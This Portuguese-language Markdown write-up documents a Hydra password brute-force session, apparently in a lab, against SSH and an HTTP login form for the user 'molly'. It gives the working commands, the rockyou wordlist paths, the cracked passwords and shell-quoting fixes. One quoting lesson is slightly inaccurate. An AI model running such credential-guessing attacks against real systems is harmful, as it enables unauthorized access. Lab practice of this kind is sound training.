# Hydra Brute Force - Sessão de Testes

Documentação dos comandos e resultados da sessão de brute force contra alvo `10.67.139.42`.

---

## 🎯 Alvo

- **IP:** `10.67.139.42`
- **Usuário testado:** `molly`
- **Serviços:** SSH (22), HTTP (80) - formulário `/login`

---

## 🔑 Credenciais Encontradas

| Serviço | Usuário | Senha | Status |
|---------|---------|-------|--------|
| SSH | molly | **butterfly** | ✅ Funcionou |
| HTTP POST /login | molly | **sunshine** | ✅ Funcionou |

---

## 📋 Comandos que Funcionaram

### SSH - Teste senha única (falhou)
```bash
hydra -l molly -p sunshine ssh://10.67.139.42 -t 4 -v
```
**Resultado:** Falhou (senha incorreta para SSH)

### HTTP POST /login - Sucesso (senha única)
```bash
hydra -l molly -p sunshine 10.67.139.42 http-post-form "$MODULE" -s 80 -t 4 -v
```
**Resultado:** ✅ **Senha encontrada: `sunshine`**

### SSH - Sucesso (wordlist rockyou-10.txt)
```bash
hydra -l molly -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt ssh://10.67.139.42 -t 4 -v
```
**Resultado:** ✅ **Senha encontrada: `butterfly`**

---

## 🌐 HTTP POST Form - Problemas com Aspas

### ❌ Erro: aspas duplas causam expansão do shell
```bash
# NÃO FUNCIONA - bash expande ^USER^ ^PASS^ e & vira background
hydra -l molly -P rockyou-10.txt 10.67.139.42 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=incorrect" -s 80 -t 4 -v
```

### ✅ Solução 1: Aspas simples + escape do `&`
```bash
hydra -l molly -P rockyou-10.txt 10.67.139.42 http-post-form \
  '/login:username=^USER^\&password=^PASS^:F=incorrect' -s 80 -t 4 -v
```

### ✅ Solução 2: Variável (recomendado para zsh)
```bash
MODULE='/login:username=^USER^&password=^PASS^:F=incorrect'
hydra -l molly -P rockyou-10.txt 10.67.139.42 http-post-form "$MODULE" -s 80 -t 4 -v
```

### ✅ Solução 3: $'' no zsh
```bash
hydra -l molly -P rockyou-10.txt 10.67.139.42 http-post-form \
  $'/login:username=^USER^&password=^PASS^:F=incorrect' -s 80 -t 4 -v
```

---

## 📝 Lições Aprendidas

1. **Aspas duplas** expandem variáveis (`^USER^`, `^PASS^`) e operadores (`&`)
2. **Aspas simples** preservam literal, mas `&` ainda pode ser problemático no zsh
3. **Variável** é a forma mais limpa e confiável
4. **`-m /login`** pode ser necessário se Hydra não detectar o path automaticamente
5. **rockyou-10.txt** (top 10) é rápido para teste; use rockyou.txt completo para real

---

## 🏁 Próximos Passos

```bash
# Testar SSH com a senha encontrada
ssh molly@10.67.139.42
# password: butterfly

# Tentar HTTP com wordlist completa se necessário
hydra -l molly -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
  10.67.139.42 http-post-form "$MODULE" -s 80 -t 4 -v
```

---

## 📺 Video

[![Hydra Brute Force Tutorial](https://img.youtube.com/vi/5_CuikST0Qc/0.jpg)](https://www.youtube.com/watch?v=5_CuikST0Qc)
